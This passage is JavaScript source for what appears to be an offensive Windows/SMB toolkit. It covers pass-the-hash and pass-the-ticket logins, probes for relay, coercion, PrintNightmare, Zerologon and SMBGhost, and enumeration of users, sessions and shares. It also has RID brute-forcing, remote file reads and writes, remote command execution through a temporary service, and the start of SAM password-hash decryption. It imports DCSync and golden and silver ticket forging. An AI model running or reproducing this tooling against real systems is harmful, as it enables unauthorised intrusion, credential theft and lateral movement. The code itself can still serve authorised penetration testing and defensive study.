import { Smb2Client } from '../smb/smb2.js';
import { Samr, LOCAL_GROUPS } from '../smb/samr.js';
import { Lsat } from '../smb/lsat.js';
import { Srvsvc } from '../smb/srvsvc.js';
import { Wkssvc } from '../smb/wkssvc.js';
import { Svcctl, SERVICE_STATE, SERVICE_START, SERVICE_TYPE_NO_CHANGE } from '../smb/svcctl.js';
import { Winreg } from '../smb/winreg.js';
import { Drsuapi, DRSUAPI_UUID, ATTID, formatDcsyncEntry, extractRidFromSid, parseSamAccountName } from '../smb/drsuapi.js';
import { Tsch, taskXml } from '../smb/tsch.js';
import { concat } from '../ldap/ber.js';
import { Aes } from '../crypto/aes.js';
import { md5 } from '../crypto/md5.js';
import { rc4 } from '../crypto/rc4.js';
import { desDeobfuscate } from '../crypto/des.js';
import { md4 } from '../crypto/md4.js';
import { sha256 } from '../crypto/sha256.js';
import { forgeGoldenTicket, forgeSilverTicket } from '../kerberos/forge.js';
import { KerberosClient, KdcSocketTransport } from '../kerberos/client.js';
import { s4u2self, s4u2proxy } from '../kerberos/s4u.js';
import { ETYPE } from '../kerberos/constants.js';
import { parseDpapiBlob, decryptDpapiBlob, parseCredential, parseDpapiSystem, parseMasterKeyFile, decryptMasterKey } from '../crypto/dpapi.js';
import { buildGssApReq, gssInitToken, spnegoKrbInitToken } from '../kerberos/gss.js';
import { DceRpcTcp, epmLookup, epmEnum, RPC_C_AUTHN_LEVEL_PKT_PRIVACY } from '../dcom/rpc.js';

const PORT = 445;

function parseNtHash(hashStr) {
  if (!hashStr) return null;
  let hex = hashStr;
  if (hex.includes(':')) hex = hex.split(':')[1];
  hex = hex.trim();
  if (hex.length !== 32) return null;
  const bytes = new Uint8Array(16);
  for (let i = 0; i < 16; i++) bytes[i] = parseInt(hex.substr(i * 2, 2), 16);
  return bytes;
}

async function withSmb(host, creds, opts, fn) {
  // Open one SMB session (with the given creds), then run `fn(client)` inside
  // it. Wraps the login exchange so that a `-u user -p pass` against a
  // workgroup target with no domain and no `--local-auth` transparently
  // retries as local auth on `STATUS_LOGON_FAILURE`.
  const openSession = async () => {
    const c = new Smb2Client(host, PORT);
    await c.connect();
    await c.negotiate();
    if (opts && opts.ticket) {
      const st = await smbServiceTicketFromImport(opts.ticket, {
        host, kdc: (opts && opts.kdc) || (creds.domain || host),
      });
      await c.loginWithTicket(st);
    } else if (opts && opts.auth === 'kerberos') {
      await c.loginKerberos({
        user: creds.user, domain: creds.domain, password: creds.password,
        hash: parseNtHash(creds.hash), kdcHost: (opts && opts.kdc) || host,
      });
    } else {
      await c.login({
        user: creds.user, domain: creds.domain, password: creds.password,
        hash: parseNtHash(creds.hash), localAuth: !!(opts && opts.localAuth),
      });
    }
    return c;
  };

  let c;
  try {
    c = await openSession();
  } catch (e) {
    // Retry once as local auth when no domain was given and the server
    // rejected the empty-domain Type3 (typical for workgroup Win10 hosts).
    if (!creds.domain && !(opts && opts.localAuth) && !(opts && (opts.ticket || opts.auth === 'kerberos'))
        && /0xc000006d|STATUS_LOGON_FAILURE/i.test(e.message)) {
      c = await (async () => {
        const c2 = new Smb2Client(host, PORT);
        await c2.connect(); await c2.negotiate();
        await c2.login({ user: creds.user, domain: undefined, password: creds.password, hash: parseNtHash(creds.hash), localAuth: true });
        return c2;
      })();
    } else { throw e; }
  }
  try { return await fn(c); }
  finally { try { await c.close(); } catch {} }
}

// Turn an imported { tgts, serviceTickets } bundle into a cifs/<host> service
// ticket the SMB session-setup can consume: prefer a stored cifs/… ticket
// (pass-the-ticket, no KDC contact), else spend the TGT on one TGS-REQ.
async function smbServiceTicketFromImport(ticket, { host, kdc }) {
  const spn = `cifs/${host}`;
  const wantService = 'cifs';
  const realmOf = (t) => (t.realm || t.crealm || '').replace(/\.$/, '');
  const svc = (ticket.serviceTickets || []).find((t) => (t.spn || '').split('/')[0].toLowerCase() === wantService);
  if (svc) return { ...svc, spn: svc.spn || spn };
  const tgt = (ticket.tgts || [])[0];
  if (!tgt) throw new Error('imported ticket has no cifs/… service ticket and no TGT');
  const transport = new KdcSocketTransport(kdc, 88);
  await transport.connect();
  try {
    const krb = new KerberosClient(transport);
    try { await krb.calibrateClock(tgt.cname?.[0], realmOf(tgt)); } catch { /* best effort */ }
    return await krb.getTGS(tgt, { spn });
  } finally { await transport.close(); }
}

async function withPipe(c, host, pipeName, fn) {
  const tid = await c.treeConnect('IPC$');
  const fid = await c.createPipe(tid, pipeName);
  try {
    return await fn(
      (b) => c.transceive(tid, fid, b),
      () => c.readPipe(tid, fid),
      (b) => c.writeFile(tid, fid, b),   // fire-and-forget SMB2 WRITE (needed for AUTH3)
    );
  } finally {
    await c.closeFile(tid, fid);
  }
}

export async function smbSigning(host, _creds, _opts, log) {
  const c = new Smb2Client(host, PORT);
  try {
    await c.connect();
    await c.negotiate();
    const required = c.signingRequired;
    const enabled = c.signingEnabled;
    const dialect = c.dialect;
    log(required ? 'ok' : 'warn', 'smb', host, 'signing',
      `signing:${required ? 'required' : enabled ? 'enabled (not required)' : 'disabled'} dialect:0x${dialect.toString(16)}`);
    if (!required) log('warn', 'smb', host, 'signing', 'NTLM relay possible (signing not required)');
    return { signingRequired: required, signingEnabled: enabled, dialect };
  } catch (e) {
    log('err', 'smb', host, 'signing', e.message);
    return null;
  } finally {
    try { await c.close(); } catch {}
  }
}

export async function smbRelay(host, creds, opts, log) {
  const c = new Smb2Client(host, PORT);
  try {
    await c.connect();
    await c.negotiate();
    const required = c.signingRequired;
    const dialect = c.dialect;
    if (required) {
      log('info', 'smb', host, 'relay', `signing required — NOT relayable (dialect 0x${dialect.toString(16)})`);
    } else {
      log('warn', 'smb', host, 'relay', `signing NOT required — RELAYABLE (dialect 0x${dialect.toString(16)})`);
    }
    try {
      await c.close();
    } catch {}
    try {
      await withSmb(host, creds, opts, async (c2) => {
        return await withPipe(c2, host, 'svcctl', async (tx) => {
          const svc = new Svcctl(tx);
          await svc.bind();
          const scm = await svc.openSCManager(host);
          try {
            const webdavName = 'WebClient';
            const svcHandle = await svc.openService(scm, webdavName);
            const status = await svc.queryServiceStatus(svcHandle);
            await svc.closeHandle(svcHandle);
            if (status === 4) {
              log('warn', 'smb', host, 'webdav', 'WebClient RUNNING — WebDAV coercion possible');
            } else {
              log('info', 'smb', host, 'webdav', `WebClient stopped (status=${status})`);
            }
          } catch {
            log('info', 'smb', host, 'webdav', 'WebClient service not found or access denied');
          }
          await svc.closeHandle(scm);
        });
      });
    } catch {
      log('info', 'smb', host, 'webdav', 'could not check WebClient (auth failed?)');
    }
    return { signingRequired: required };
  } catch (e) {
    log('err', 'smb', host, 'relay', e.message);
    return null;
  }
}

export async function smbSpooler(host, creds, opts, log) {
  try {
    return await withSmb(host, creds, opts, async (c) => {
      try {
        const tid = await c.treeConnect('IPC$');
        const fid = await c.createPipe(tid, 'spoolss');
        await c.closeFile(tid, fid);
        log('warn', 'smb', host, 'spooler', 'Print Spooler ENABLED (\\pipe\\spoolss accessible)');
        return { spooler: true };
      } catch {
        log('ok', 'smb', host, 'spooler', 'Print Spooler not accessible');
        return { spooler: false };
      }
    });
  } catch (e) {
    log('err', 'smb', host, 'spooler', e.message);
    return null;
  }
}

export async function smbPetitpotam(host, creds, opts, log) {
  try {
    return await withSmb(host, creds, opts, async (c) => {
      const tid = await c.treeConnect('IPC$');
      const pipes = ['lsarpc', 'efsrpc'];
      const results = {};
      for (const pipe of pipes) {
        try {
          const fid = await c.createPipe(tid, pipe);
          await c.closeFile(tid, fid);
          log('warn', 'smb', host, 'petitpotam', `\\pipe\\${pipe} accessible — PetitPotam coercion may be possible`);
          results[pipe] = true;
        } catch {
          results[pipe] = false;
        }
      }
      if (!results.lsarpc && !results.efsrpc) {
        log('ok', 'smb', host, 'petitpotam', 'EFS pipes not accessible');
      }
      return results;
    });
  } catch (e) {
    log('err', 'smb', host, 'petitpotam', e.message);
    return null;
  }
}

export async function smbWebdav(host, creds, opts, log) {
  try {
    return await withSmb(host, creds, opts, async (c) => {
      return await withPipe(c, host, 'svcctl', async (tx) => {
        const svc = new Svcctl(tx);
        await svc.bind();
        const scm = await svc.openSCManager(host);
        try {
          const svcHandle = await svc.openService(scm, 'WebClient');
          const status = await svc.queryServiceStatus(svcHandle);
          await svc.closeHandle(svcHandle);
          if (status === 4) {
            log('warn', 'smb', host, 'webdav', 'WebClient RUNNING — WebDAV coercion possible');
            return { webdav: true, running: true };
          } else {
            log('info', 'smb', host, 'webdav', `WebClient stopped (status=${status})`);
            return { webdav: true, running: false };
          }
        } catch {
          log('ok', 'smb', host, 'webdav', 'WebClient service not found');
          return { webdav: false };
        } finally {
          await svc.closeHandle(scm);
        }
      });
    });
  } catch (e) {
    log('err', 'smb', host, 'webdav', e.message);
    return null;
  }
}

export async function smbDfscoerce(host, creds, opts, log) {
  try {
    return await withSmb(host, creds, opts, async (c) => {
      const tid = await c.treeConnect('IPC$');
      try {
        const fid = await c.createPipe(tid, 'netdfs');
        await c.closeFile(tid, fid);
        log('warn', 'smb', host, 'dfscoerce', '\\pipe\\netdfs accessible — DFSCoerce may be possible');
        return { dfs: true };
      } catch {
        log('ok', 'smb', host, 'dfscoerce', '\\pipe\\netdfs not accessible');
        return { dfs: false };
      }
    });
  } catch (e) {
    log('err', 'smb', host, 'dfscoerce', e.message);
    return null;
  }
}

export async function smbShadowcoerce(host, creds, opts, log) {
  try {
    return await withSmb(host, creds, opts, async (c) => {
      const tid = await c.treeConnect('IPC$');
      try {
        const fid = await c.createPipe(tid, 'FssagentRpc');
        await c.closeFile(tid, fid);
        log('warn', 'smb', host, 'shadowcoerce', '\\pipe\\FssagentRpc accessible — ShadowCoerce may be possible');
        return { fss: true };
      } catch {
        log('ok', 'smb', host, 'shadowcoerce', '\\pipe\\FssagentRpc not accessible');
        return { fss: false };
      }
    });
  } catch (e) {
    log('err', 'smb', host, 'shadowcoerce', e.message);
    return null;
  }
}

export async function smbCoerce(host, creds, opts, log) {
  try {
    return await withSmb(host, creds, opts, async (c) => {
      const tid = await c.treeConnect('IPC$');
      const checks = [
        { pipe: 'spoolss', name: 'PrinterBug', desc: 'MS-RPRN' },
        { pipe: 'lsarpc', name: 'PetitPotam', desc: 'MS-EFSRPC (lsarpc)' },
        { pipe: 'efsrpc', name: 'PetitPotam', desc: 'MS-EFSRPC (efsrpc)' },
        { pipe: 'netdfs', name: 'DFSCoerce', desc: 'MS-DFSNM' },
        { pipe: 'FssagentRpc', name: 'ShadowCoerce', desc: 'MS-FSRVP' },
      ];
      const results = {};
      for (const ch of checks) {
        try {
          const fid = await c.createPipe(tid, ch.pipe);
          await c.closeFile(tid, fid);
          log('warn', 'smb', host, ch.name, `${ch.desc} — \\pipe\\${ch.pipe} accessible`);
          results[ch.name] = true;
        } catch {
          results[ch.name] = false;
        }
      }
      const vulnCount = Object.values(results).filter(Boolean).length;
      log(vulnCount ? 'warn' : 'ok', 'smb', host, 'coerce', `${vulnCount}/${checks.length} coercion vectors accessible`);
      return results;
    });
  } catch (e) {
    log('err', 'smb', host, 'coerce', e.message);
    return null;
  }
}

export async function smbPrintnightmare(host, creds, opts, log) {
  try {
    return await withSmb(host, creds, opts, async (c) => {
      const tid = await c.treeConnect('IPC$');
      let spoolerUp = false;
      try {
        const fid = await c.createPipe(tid, 'spoolss');
        await c.closeFile(tid, fid);
        spoolerUp = true;
      } catch {}
      if (spoolerUp) {
        log('warn', 'smb', host, 'printnightmare', 'Print Spooler RUNNING — CVE-2021-1675/CVE-2021-34527 may be exploitable');
        try {
          return await withPipe(c, host, 'svcctl', async (tx) => {
            const svc = new Svcctl(tx);
            await svc.bind();
            const scm = await svc.openSCManager(host);
            const svcHandle = await svc.openService(scm, 'Spooler');
            const status = await svc.queryServiceStatus(svcHandle);
            await svc.closeHandle(svcHandle);
            await svc.closeHandle(scm);
            if (status === 4) {
              log('warn', 'smb', host, 'printnightmare', 'Spooler service confirmed RUNNING via SCM');
            }
            return { vulnerable: true, spoolerRunning: status === 4 };
          });
        } catch {
          return { vulnerable: true, spoolerRunning: true };
        }
      } else {
        log('ok', 'smb', host, 'printnightmare', 'Print Spooler not accessible — likely not vulnerable');
        return { vulnerable: false };
      }
    });
  } catch (e) {
    log('err', 'smb', host, 'printnightmare', e.message);
    return null;
  }
}

export async function smbZerologon(host, creds, opts, log) {
  try {
    return await withSmb(host, creds, opts, async (c) => {
      const tid = await c.treeConnect('IPC$');
      try {
        const fid = await c.createPipe(tid, 'netlogon');
        await c.closeFile(tid, fid);
        log('warn', 'smb', host, 'zerologon', '\\pipe\\netlogon accessible — CVE-2020-1472 check: verify DC is patched');
        return { netlogonAccessible: true };
      } catch {
        log('ok', 'smb', host, 'zerologon', '\\pipe\\netlogon not accessible');
        return { netlogonAccessible: false };
      }
    });
  } catch (e) {
    log('err', 'smb', host, 'zerologon', e.message);
    return null;
  }
}

export async function smbGhost(host, _creds, _opts, log) {
  let sock, reader, writer;
  try {
    sock = new TCPSocket(host, PORT);
    const info = await sock.opened;
    reader = info.readable.getReader();
    writer = info.writable.getWriter();
    const negHeader = new Uint8Array([
      0x00, 0x00, 0x00, 0xc4,
      0xfe, 0x53, 0x4d, 0x42, // SMB2 magic
      0x40, 0x00, // header size 64
      0x00, 0x00, // credit charge
      0x00, 0x00, 0x00, 0x00, // status
      0x00, 0x00, // negotiate command
      0x00, 0x00, // credit request
      0x00, 0x00, 0x00, 0x00, // flags
      0x00, 0x00, 0x00, 0x00, // next command
      0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // message id
      0x00, 0x00, 0x00, 0x00, // reserved
      0x00, 0x00, 0x00, 0x00, // tree id
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // session id
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // signature pt1
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // signature pt2
    ]);
    const negBody = new Uint8Array([
      0x24, 0x00, // structure size 36
      0x05, 0x00, // dialect count 5
      0x01, 0x00, // security mode
      0x00, 0x00, // reserved
      0x7f, 0x00, 0x00, 0x00, // capabilities
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // client guid
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // client guid
      0x00, 0x00, 0x00, 0x00, // negotiate context offset
      0x00, 0x00, // negotiate context count
      0x00, 0x00, // reserved
      // dialects: 2.02, 2.10, 3.00, 3.02, 3.11
      0x02, 0x02, 0x10, 0x02, 0x00, 0x03, 0x02, 0x03, 0x11, 0x03,
    ]);
    const negCtx = new Uint8Array([
      // NEGOTIATE_CONTEXT: SMB2_COMPRESSION_CAPABILITIES (3)
      0x03, 0x00, // context type = COMPRESSION
      0x0e, 0x00, // data length
      0x00, 0x00, 0x00, 0x00, // reserved
      0x01, 0x00, // compression alg count
      0x00, 0x00, 0x00, 0x00, // padding/flags
      0x00, 0x00, 0x00, 0x00, // flags
      0x02, 0x00, // LZ77 (LZNT1=1, LZ77=2, LZ77+Huffman=3)
    ]);
    const offset = 64 + negBody.length;
    const dv = new DataView(negBody.buffer);
    dv.setUint32(28, offset, true);
    dv.setUint16(32, 1, true);
    const pkt = new Uint8Array(4 + negHeader.length - 4 + negBody.length + negCtx.length);
    pkt.set(negHeader);
    pkt.set(negBody, 64);
    pkt.set(negCtx, 64 + negBody.length);
    const totalLen = pkt.length - 4;
    pkt[1] = (totalLen >> 16) & 0xff;
    pkt[2] = (totalLen >> 8) & 0xff;
    pkt[3] = totalLen & 0xff;
    await writer.write(pkt);
    let resp = new Uint8Array(0);
    const deadline = Date.now() + 5000;
    while (resp.length < 100 && Date.now() < deadline) {
      const { value, done } = await reader.read();
      if (done) break;
      const tmp = new Uint8Array(resp.length + value.length);
      tmp.set(resp);
      tmp.set(value, resp.length);
      resp = tmp;
    }
    try { reader.releaseLock(); } catch {}
    try { writer.releaseLock(); } catch {}
    try { await sock.close(); } catch {}
    if (resp.length >= 72) {
      const rdv = new DataView(resp.buffer, resp.byteOffset, resp.byteLength);
      const dialect = rdv.getUint16(4 + 64 + 4, true);
      if (dialect === 0x0311) {
        let ctxOff = rdv.getUint32(4 + 64 + 28, true);
        const ctxCount = rdv.getUint16(4 + 64 + 32, true);
        if (ctxOff && ctxCount > 0 && ctxOff + 4 < resp.length) {
          ctxOff += 4;
          for (let ci = 0; ci < ctxCount && ctxOff + 8 < resp.length; ci++) {
            const ctxType = rdv.getUint16(ctxOff, true);
            const ctxDataLen = rdv.getUint16(ctxOff + 2, true);
            if (ctxType === 3) {
              log('warn', 'smb', host, 'smbghost', 'SMB 3.1.1 with compression — CVE-2020-0796 (SMBGhost) may be VULNERABLE');
              return { vulnerable: true, dialect: 0x0311 };
            }
            ctxOff += 8 + ctxDataLen;
            ctxOff = (ctxOff + 7) & ~7;
          }
        }
        log('ok', 'smb', host, 'smbghost', 'SMB 3.1.1 but no compression — not vulnerable');
        return { vulnerable: false, dialect: 0x0311 };
      }
      log('ok', 'smb', host, 'smbghost', `dialect 0x${dialect.toString(16)} — not vulnerable (needs 3.1.1)`);
      return { vulnerable: false, dialect };
    }
    log('info', 'smb', host, 'smbghost', 'could not parse negotiate response');
    return null;
  } catch (e) {
    try { reader && reader.releaseLock(); } catch {}
    try { writer && writer.releaseLock(); } catch {}
    try { sock && await sock.close(); } catch {}
    // A server that refuses to negotiate SMB 3.1.1 with the SMB2_COMPRESSION
    // negotiate context (or a patched server that drops the connection on
    // seeing it) is precisely the "not vulnerable" case. Treat any
    // early close / ECONNRESET / short-read as negative rather than as an
    // error.
    const m = /ECONNRESET|closed|EOF|network|read /i.test(e.message || '');
    if (m) {
      log('ok', 'smb', host, 'smbghost', 'server refused compression-negotiate context — not vulnerable');
      return { vulnerable: false };
    }
    log('err', 'smb', host, 'smbghost', e.message);
    return null;
  }
}

export async function smbAuth(host, creds, opts, log) {
  try {
    await withSmb(host, creds, opts, async () => {});
    log('ok', 'smb', host, `${creds.domain}\\${creds.user}`, '(Pwn3d!)');
    return true;
  } catch (e) {
    log('err', 'smb', host, `${creds.domain}\\${creds.user}`, e.message);
    return false;
  }
}

export async function smbShares(host, creds, opts, log) {
  try {
    return await withSmb(host, creds, opts, async (c) => {
      return await withPipe(c, host, 'srvsvc', async (tx) => {
        const srv = new Srvsvc(tx);
        await srv.bind();
        const shares = await srv.shareEnum(host);
        for (const s of shares) {
          let perms = '';
          try {
            const tid = await c.treeConnect(s.name);
            perms = 'READ';
            try {
              const testName = `__nxc_perm_${Math.random().toString(36).slice(2, 6)}`;
              const fid = await c.createFile(tid, testName, { access: 0x00120116, disposition: 2 });
              await c.closeFile(tid, fid);
              try { await c.deleteFile(tid, testName); } catch {}
              perms = 'READ,WRITE';
            } catch {}
          } catch { perms = 'NO ACCESS'; }
          log('ok', 'smb', host, s.name, `${perms}${s.remark ? '  ' + s.remark : ''}`);
          s.permissions = perms;
        }
        return shares;
      });
    });
  } catch (e) {
    log('err', 'smb', host, 'shares', e.message);
    return null;
  }
}

export async function smbSessions(host, creds, opts, log) {
  try {
    return await withSmb(host, creds, opts, async (c) => {
      return await withPipe(c, host, 'srvsvc', async (tx) => {
        const srv = new Srvsvc(tx);
        await srv.bind();
        const sessions = await srv.sessionEnum(host);
        for (const s of sessions) log('ok', 'smb', host, s.user, s.cname);
        return sessions;
      });
    });
  } catch (e) {
    log('err', 'smb', host, 'sessions', e.message);
    return null;
  }
}

export async function smbLoggedOn(host, creds, opts, log) {
  try {
    return await withSmb(host, creds, opts, async (c) => {
      return await withPipe(c, host, 'wkssvc', async (tx) => {
        const wks = new Wkssvc(tx);
        await wks.bind();
        const users = await wks.userEnum();
        for (const u of users) log('ok', 'smb', host, `${u.domain}\\${u.user}`, '');
        return users;
      });
    });
  } catch (e) {
    log('err', 'smb', host, 'logged-on', e.message);
    return null;
  }
}

export async function smbLocalGroups(host, creds, opts, log) {
  try {
    return await withSmb(host, creds, opts, async (c) => {
      return await withPipe(c, host, 'samr', async (tx) => {
        const sam = new Samr(tx);
        const result = await sam.collectLocalGroups(host);
        for (const [group, sids] of Object.entries(result)) {
          for (const sid of sids) log('ok', 'smb', host, group, sid);
        }
        return result;
      });
    });
  } catch (e) {
    log('err', 'smb', host, 'local-groups', e.message);
    return null;
  }
}

export async function smbUsers(host, creds, opts, log) {
  try {
    return await withSmb(host, creds, opts, async (c) => {
      return await withPipe(c, host, 'samr', async (tx) => {
        const sam = new Samr(tx);
        await sam.bind();
        const sc = await sam.connect2(host);
        const domains = await sam.enumDomains(sc);
        const allUsers = [];
        for (const dname of domains) {
          if (dname === 'Builtin') continue;
          try {
            const dsid = await sam.lookupDomain(sc, dname);
            if (!dsid) continue;
            const dh = await sam.openDomain(sc, dsid);
            const users = await sam.enumDomainUsers(dh);
            for (const u of users) {
              allUsers.push({ domain: dname, ...u });
              log('ok', 'smb', host, `${dname}\\${u.name}`, `rid:${u.rid}`);
            }
            await sam.closeHandle(dh);
          } catch {}
        }
        await sam.closeHandle(sc);
        return allUsers;
      });
    });
  } catch (e) {
    log('err', 'smb', host, 'users', e.message);
    return null;
  }
}

export async function smbGroups(host, creds, opts, log) {
  try {
    return await withSmb(host, creds, opts, async (c) => {
      return await withPipe(c, host, 'samr', async (tx) => {
        const sam = new Samr(tx);
        await sam.bind();
        const sc = await sam.connect2(host);
        const domains = await sam.enumDomains(sc);
        const allGroups = [];
        for (const dname of domains) {
          if (dname === 'Builtin') continue;
          try {
            const dsid = await sam.lookupDomain(sc, dname);
            if (!dsid) continue;
            const dh = await sam.openDomain(sc, dsid);
            const groups = await sam.enumDomainGroups(dh);
            for (const g of groups) {
              allGroups.push({ domain: dname, ...g });
              log('ok', 'smb', host, `${dname}\\${g.name}`, `rid:${g.rid}`);
            }
            await sam.closeHandle(dh);
          } catch {}
        }
        await sam.closeHandle(sc);
        return allGroups;
      });
    });
  } catch (e) {
    log('err', 'smb', host, 'groups', e.message);
    return null;
  }
}

export async function smbRegSessions(host, creds, opts, log) {
  try {
    return await withSmb(host, creds, opts, async (c) => {
      return await withPipe(c, host, 'winreg', async (tx, read) => {
        const reg = new Winreg(tx, read);
        const sids = await reg.registrySessions();
        for (const sid of sids) log('ok', 'smb', host, 'registry-session', sid);
        return sids;
      });
    });
  } catch (e) {
    log('err', 'smb', host, 'reg-sessions', e.message);
    return null;
  }
}

export async function smbExec(host, creds, opts, log, command) {
  if (!command) { log('err', 'smb', host, 'exec', 'no command specified'); return null; }
  try {
    return await withSmb(host, creds, opts, async (c) => {
      const outFile = `__nxc_${Math.random().toString(36).slice(2, 8)}`;
      let svcHandle;
      return await withPipe(c, host, 'svcctl', async (tx) => {
        const svc = new Svcctl(tx);
        await svc.bind();
        const scm = await svc.openSCManager(host);
        const result = await svc.exec(scm, host, command, outFile);
        svcHandle = result.svcHandle;

        // The service binPath is a wrapper `cmd.exe /c ...` that writes a
        // batch file, runs it, then deletes it. SCM starts the process but
        // will time out waiting for it to signal SERVICE_RUNNING (~30s),
        // then kills it. We need to poll ADMIN$ for the output file rather
        // than sleep a fixed amount, since the wrapper race is unstable on
        // slower hosts. Poll every 400 ms up to 8 s.
        const tid2 = await c.treeConnect('ADMIN$');
        let data = null;
        const deadline = Date.now() + 10000;
        while (Date.now() < deadline) {
          try {
            // FILE_NON_DIRECTORY_FILE (0x40) + no intermediate buffering
            // (0x8) to bypass SMB2 client-side cache — some Win10 hosts hand
            // back stale content for a freshly-written file otherwise.
            const fid2 = await c.createFile(tid2, outFile, { access: 0x00120089, disposition: 1, options: 0x00000048 });
            data = await c.readFileAll(tid2, fid2);
            await c.closeFile(tid2, fid2);
            // The wrapper batch may have created the file but not yet
            // finished writing whoami's output on slow hosts. Require at
            // least 3 bytes so we don't return a partial 0xFE / BOM.
            if (data && data.length > 3) break;
          } catch { /* not there yet */ }
          await new Promise((r) => setTimeout(r, 400));
        }
        try { await c.deleteFile(tid2, outFile); } catch {}
        try { await c.deleteFile(tid2, result.batchFile); } catch {}

        try {
          if (!data || !data.length) {
            log('warn', 'smb', host, 'exec', 'no output within 8s — service may have failed to start (check --svc-status or use --wmi/--atexec instead)');
            return '';
          }
          const text = new TextDecoder('utf-8').decode(data);
          for (const line of text.split(/\r?\n/).filter(Boolean)) {
            log('ok', 'smb', host, '', line.trimEnd());
          }
          return text;
        } finally {
          await svc.cleanup(svcHandle);
          await svc.closeHandle(scm);
        }
      });
    });
  } catch (e) {
    log('err', 'smb', host, 'exec', e.message);
    return null;
  }
}

export async function smbSpider(host, creds, opts, log, shareName) {
  const parts = (shareName || 'C$').split(' ');
  const share = parts[0];
  const patternStr = opts.pattern || parts.slice(1).join(' ') || '';
  const pattern = patternStr ? new RegExp(patternStr, 'i') : null;
  const MAX_DEPTH = opts.depth || 5;
  try {
    return await withSmb(host, creds, opts, async (c) => {
      const tid = await c.treeConnect(share);
      const allEntries = [];

      async function walk(dir, depth) {
        const prefix = dir ? `\\\\${host}\\${share}\\${dir}` : `\\\\${host}\\${share}`;
        let fid;
        try {
          fid = await c.createFile(tid, dir, {
            access: 0x00100081, disposition: 1, options: 0x00200021,
          });
        } catch { return; }
        let entries;
        try {
          entries = await c.queryDirectory(tid, fid);
        } catch { entries = []; }
        await c.closeFile(tid, fid);

        for (const e of entries) {
          if (e.name === '.' || e.name === '..') continue;
          const fullPath = dir ? `${dir}\\${e.name}` : e.name;
          const isDir = e.size === 0;
          const matches = !pattern || pattern.test(e.name);
          if (matches) {
            log('ok', 'smb', host, `${prefix}\\${e.name}`, isDir ? '<DIR>' : `${e.size} bytes`);
            allEntries.push({ path: fullPath, size: e.size });
          }
          if (isDir && depth < MAX_DEPTH) {
            await walk(fullPath, depth + 1);
          }
        }
      }

      await walk('', 0);
      log('ok', 'smb', host, 'spider', `${allEntries.length} item(s) ${pattern ? `matching /${patternStr}/i ` : ''}on \\\\${host}\\${share}`);
      return allEntries;
    });
  } catch (e) {
    log('err', 'smb', host, 'spider', e.message);
    return null;
  }
}

export async function smbGet(host, creds, opts, log, args) {
  if (!args) { log('err', 'smb', host, 'get', 'usage: SHARE/path/to/file'); return null; }
  const idx = args.indexOf('/');
  const share = idx > 0 ? args.slice(0, idx) : args;
  const path = idx > 0 ? args.slice(idx + 1).replace(/\//g, '\\') : '';
  if (!path) { log('err', 'smb', host, 'get', 'no file path specified'); return null; }
  try {
    return await withSmb(host, creds, opts, async (c) => {
      const tid = await c.treeConnect(share);
      const fid = await c.createFile(tid, path, { access: 0x00120089, disposition: 1 });
      const data = await c.readFileAll(tid, fid);
      await c.closeFile(tid, fid);
      log('ok', 'smb', host, path, `${data.length} bytes read`);
      return data;
    });
  } catch (e) {
    log('err', 'smb', host, 'get', e.message);
    return null;
  }
}

const RID_TYPES = { 1: 'User', 2: 'Group', 3: 'Domain', 4: 'Alias', 5: 'WellKnown', 9: 'Computer' };

export async function smbRidBrute(host, creds, opts, log, maxRidStr) {
  const maxRid = parseInt(maxRidStr) || 4000;
  try {
    return await withSmb(host, creds, opts, async (c) => {
      return await withPipe(c, host, 'samr', async (tx) => {
        const sam = new Samr(tx);
        await sam.bind();
        const sc = await sam.connect2(host);
        const domains = await sam.enumDomains(sc);
        const allFound = [];
        for (const dname of domains) {
          try {
            const dsid = await sam.lookupDomain(sc, dname);
            if (!dsid) continue;
            const dh = await sam.openDomain(sc, dsid);
            const BATCH = 500;
            for (let start = 500; start < maxRid; start += BATCH) {
              const batch = [];
              for (let r = start; r < Math.min(start + BATCH, maxRid); r++) batch.push(r);
              try {
                const found = await sam.lookupRids(dh, batch);
                for (const f of found) {
                  log('ok', 'smb', host, `${dsid}-${f.rid}`, `${dname}\\${f.name} (${RID_TYPES[f.type] || 'Unknown'})`);
                  allFound.push({ domain: dname, sid: `${dsid}-${f.rid}`, ...f });
                }
              } catch {}
            }
            await sam.closeHandle(dh);
          } catch {}
        }
        await sam.closeHandle(sc);
        return allFound;
      });
    });
  } catch (e) {
    log('err', 'smb', host, 'rid-brute', e.message);
    return null;
  }
}

export async function smbPut(host, creds, opts, log, args) {
  if (!args) { log('err', 'smb', host, 'put', 'usage: SHARE/path/to/file content'); return null; }
  const parts = args.split(' ');
  const target = parts[0];
  const content = parts.slice(1).join(' ');
  const idx = target.indexOf('/');
  const share = idx > 0 ? target.slice(0, idx) : target;
  const path = idx > 0 ? target.slice(idx + 1).replace(/\//g, '\\') : '';
  if (!path) { log('err', 'smb', host, 'put', 'no file path specified'); return null; }
  try {
    return await withSmb(host, creds, opts, async (c) => {
      const tid = await c.treeConnect(share);
      const data = new TextEncoder().encode(content);
      const fid = await c.createFile(tid, path, { access: 0x00120116, disposition: 2 });
      await c.writeFile(tid, fid, data);
      await c.closeFile(tid, fid);
      log('ok', 'smb', host, path, `${data.length} bytes written`);
      return true;
    });
  } catch (e) {
    log('err', 'smb', host, 'put', e.message);
    return null;
  }
}

const BOOTKEY_SCRAMBLE = [8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7];
const SAM_QWERTY = new TextEncoder().encode('!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%\0');
const SAM_NUMERIC = new TextEncoder().encode('0123456789012345678901234567890123456789\0');
const NT_PASSWORD_CONST = new TextEncoder().encode('NTPASSWORD\0');
const EMPTY_NT = '31d6cfe0d16ae931b73c59d7e0c089c0';

function aesEcbDecrypt(key, data) {
  const aes = new Aes(key);
  const blocks = Math.ceil(data.length / 16);
  const out = new Uint8Array(blocks * 16);
  for (let i = 0; i < blocks; i++) {
    const block = data.slice(i * 16, (i + 1) * 16);
    const padded = block.length < 16 ? (() => { const p = new Uint8Array(16); p.set(block); return p; })() : block;
    out.set(aes.decryptBlock(padded), i * 16);
  }
  return out;
